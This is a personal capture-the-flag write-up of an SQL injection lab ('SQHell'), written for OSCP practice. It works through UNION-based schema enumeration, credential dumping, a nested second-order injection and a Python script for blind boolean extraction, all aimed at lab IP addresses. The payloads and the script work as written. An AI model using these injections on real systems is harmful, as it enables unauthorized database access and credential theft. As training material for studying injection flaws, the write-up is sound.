# SQHell Writeup

Name: SQHell
Date:  18/2/2023
Difficulty: Medium
Description: Try and find all the flags in the SQL Injections
Goals: OSCP Prep
Learnt:
- I continuely glad I live in a time after SQLmap..
Beyond Root:
- Break down my understand a the details of how,where,why,which injecting(technique)
- Break down the syntax and the whyt

[Alh4zr3d](https://www.youtube.com/watch?v=MpJasg3IQNI)

## Login Flag

First flag is in the login input.
![](flagone.png)


##  Post

Post parametre is vulnerable - error based?
![](postParam.png)

Hmming away
![](hmm.png)

Closer after read errors corrected again..
![](closer.png)
Objective make it get the flag table

Al leads the way at 1:29
![1080](alLeadstheway.png)
My pitfall in my thinking is not considering legimate SQL as initial vulnerability and thinking that I must always break the SQL query and then fix it.

Al explains it may look like this:
```sql
-- the id param is used at the end of query like this:
SELECT id,name,author, content FROM posts WHERE id=<id param>;
-- 
SELECT id,name,author, content FROM posts WHERE id=1 UNION SELECT 1,2,3,4;
-- Look if any appear is printed onto the page
SELECT id,name,author, content FROM posts WHERE id='id','Al','root','kekw';
```
Tiberious explain another *tib bit* try the zero page. The reason being is the first query of the UNION is empty so the only row is ours. 

Inital result of the parameter had to be invalid
![1080](idididid.png)

![](mappingoutwheretoprint.png)

Al tries of database version
![1080](characterproblem.png)

[Swedish Character Set](https://stackoverflow.com/questions/3029321/troubleshooting-illegal-mix-of-collations-error-in-mysql), but Tiberious is the chat again:
![1080](buttibsisinthechat.png)

May need to try out Tiberious's Web App course...

```sql
database()
version()
user()
```

Pentest Monkey has issue with quotes. I fixed this and

```
GET /post?id=100+UNION+ALL+SELECT+'1',concat(table_schema,'+:+',table_name),database(),'4'+FROM+informational_schema.tables+WHERE+table_schema%2b!%253d%2b'mysql'+AND+table_schema+!%253d%2b'information_schema'--%2b-+ 
```

[Al](https://www.youtube.com/watch?v=MpJasg3IQNI&t=4322s)

Returning with a banging headache and banging desire to recompres and absord all the SQL I can
```sql
-- 
/post?id=100+UNION+ALL+SELECT+'0',group_concat(table_schema, '+:+',table_name),'kekw','TiberiousIsRightAgain'+FROM+information_schema.tables+WHERE+table_schema+!%3d+'mysql'+AND+table_schema+!%3d+'information_schema'--+-
```

I had the right idea about the group_concat() originally when attempted
![1080](schemandtablename.png)

Al uses the information schema to get all the tables names; here is my breakdown
```sql
-- contatenate info from these fields
-- Table schema is the map of the tables
--  table 
group_concat(table_schema, '+:+',table_name)
-- From the `tables` of the `schema` 
FROM+information_schema.tables
-- At this point of the query we have all the tables, but we do not want 
-- mysql the defulat table_name and the information schema
-- leaving just the custom tables names
+WHERE+table_schema+!%3d+'mysql'+AND+table_schema+!%3d+'information_schema'--+-
-- So for each line of the remain tables print:
-- $table_schema : $table_name
-- sqhell_5  : flag
-- sqhell_5  : posts
-- sqhell_5  : users
```

Now we can do the same for column names
```sql
id=100+UNION+ALL+SELECT+'0',group_concat(table_schema,'+%3a+',table_name,'+%3a+',column_name),'kekw','TiberiousIsRightAgain'+FROM+information_schema.columns+WHERE+column_name='flag'--+-
```
![](columnnameequalflag.png)

```
GET /post?id=100+UNION+ALL+SELECT+'0',flag,'kekw','RIP-Totalbiscuit'+FROM+flag--+-
```

![](flag5.png)

## User

![](userpage.png)



We cant register
`http://10.10.48.199/user?id=1`
![](withidpara.png)

Al points out this will get us the admin user
![](altriesforadmin.png)

Why is it always returning the Admin page?: ...because we are querying an id, the querying includes OR 1=1 so really id=(x OR 1). I tested  you can remove the comment and the =1. Interestingly
![1080](0or2.png)
Actually the database is only returning the first thing it can get.

X OR Y  - means return every line in the database that matches the query. 

So actual query is potentially
```sql
SELECT * WHERE ID=1 
-- we are adding the OR 
```

```sql
--enumerate the column and got a return
id=0+OR+2+UNION+ALL+SELECT+1,2,3--+-

```

![](columnenumyouruser.png)
```sql
-- I mistken left the OR 2; I need to think PARAM+INJECTION+COLUMNS
id=0+UNION+ALL+SELECT+'Alh4zr3d','Ippsec','Tib3rious'--+- 
```

No tiberious displayed.
![](column1and2foruser.png)

We are in sql hell 4
![1080](sqlhell4.png)

Normal we would enumerate the table names and columns says Al. So I will pause and do that.
```sql
-- 
/post?id=100+UNION+ALL+SELECT+group_concat(table_schema, '+:+',table_name),'kekw','GoingBeyond'+FROM+information_schema.tables+WHERE+table_schema+!%3d+'mysql'+AND+table_schema+!%3d+'information_schema'--+-
```

![](onlyusersalmighthavetodothis.png)

There is no flag table!
![](noflagtablein4.png)

Minor tweak from the previous usage column_name -> table_name
```sql
+UNION+ALL+SELECT+group_concat(table_schema,'+%3a+',table_name,'+%3a+',column_name),'kekw','TiberiousIsRightAgain'+FROM+information_schema.columns+WHERE+table_name='users'--+-
```

![](awesomeflag4gettingcloser.png)

My attempts - box died while trying these, lol. 
```sql
-- sqhell_4 : users : id
-- sqhell_4 : users : username
-- sqhell_4 : users : password
UNION+ALL+SELECT+id,username,password+FROM+sqhell_4.users
UNION+ALL+SELECT+group_concat(id,username,password)+FROM+sqhell_4.users
UNION+ALL+SELECT+password+FROM+sqhell_4.users--+-
UNION+ALL+SELECT+'X',group_concat(column_name),'0'+WHERE+column_name='password'+FROM+sqhell_4.users--+-
```

Unpaused - Al points out **Hint:** Unless displayed on the page the flags are stored in the flag table in the flag column

```sql
-- I was almost there!
UNION+ALL+SELECT+group_concat(username,':',password),'SQL','HELL'+FROM+sqhell_4.users--+-
```
Al is upset
![1080](whereistheflag.png)

Tiberious says this is a really difficult one Look up nested SQLi.

*A useful function in SQL is creating a query within a query, also known as a subquery or nested query. A nested query is a SELECT statement that is typically enclosed in parentheses, and embedded within a primary SELECT , INSERT , or DELETE operation.* [DigitalOcean NEst SQL](https://www.digitalocean.com/community/tutorials/how-to-use-nested-queries)

Search-Engine-Dork: sql injections 

[Coderwall Nested SQLi](https://coderwall.com/p/dnf8sa/nested-sql-injections)

Down the rabbit hole of crazy SQli types 
[PortSwigger Second Order SQLi](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)

Al second order injections
- Figure out which field has a possiblility of second order injection with `'\''` and `'"'` to generate a error.

There was probably no reasonable way I would get this flag alone currently or previously. This is the SQL Hell. I think I would be good for me to read both pages and watch Al then explain the actually query and how he got there.

![](thegiveawaytosecondsqli.png)

- Have you look at both html and Render in burp
- Is Parameter used for another query? - Second Order Injection try injecting into a parametre
- Is it Nested SQli - Nesting a SELECT inside a query

![](ooooooooooooooosqliNcePtion.png)

The first query is executed to get the usename of the admin user and the second query is done on the backend by the web application using the results of the first query.
```sql
0+UNION+ALL+SELECT+'1+UNION+ALL+SELECT+1,version(),3,4--+-','test2','test3'--+-
```

![1080](SecondSequenceOfWow.png)


## Registration

Returning back to the Registration, because why not, why does it not work.
![](theregistationcode.png)

Read the code, test what happens.
![](avaliabletrue.png)

Hey I was correct. But I chickened out as it is a blind injection. The output of the query is not display, but the information you are getting is inferable by attacker by the true and false value. This sounds like SQLmap please save me or write a script.

" Hey database I want you to get the value of the contents of the flag collumn start with f, if so the database will return some value."

I think that the beeyond root is writing this script.

https://github.com/payloadbox

We asking the database "Is the first character of the string flag a 'f', the database says true for 'X', but the database is stating that because 'X' is flase the the query after the AND is false therefore the entire query is false (because A **AND** B not A **OR** B), so the username is avalaible. If we provided a 'f' in 'flag', which is true, therefore the entire statement is true: ADMIN exists AND the first character flag is f, which then means that the database checking whether the admin username exist will return false BECAUSE it exists therefore can be used as new username.
![1080](moreKnow.png)
The accompanying picuture
![1080](blindfalse.png)

This being true means that the flag does not start with a F 
![1080](captialF.png)

THM{} is format
![](flagsstartwithT.png)

He is scripting it. YES!
```python
import requests
import string
import sys

charset = string.ascii_uppercase + "{}:" + "0123456789"
proxies = {
        'http' : 'http://localhost:8080'
        }
url = "http://10.10.247.220"
flag = ""
position = 1

# requests params={} urlencodes automatically - according to T1b3rious

while not True:
    for item in charset:
        uri = f"/register/user-check?username=admin'+AND+(select+substring(flag,{position},1)+FROM+flag)%3d'{item}'--+-"
        r = requests.get(url + uri, proxies=proxies)
        if "false" in r.text:
            flag += item
            print(flag)
            if item == '}':
                break

    position += 1

exit()
```

I learnt so much python with this.

## Terms and Conditions to get!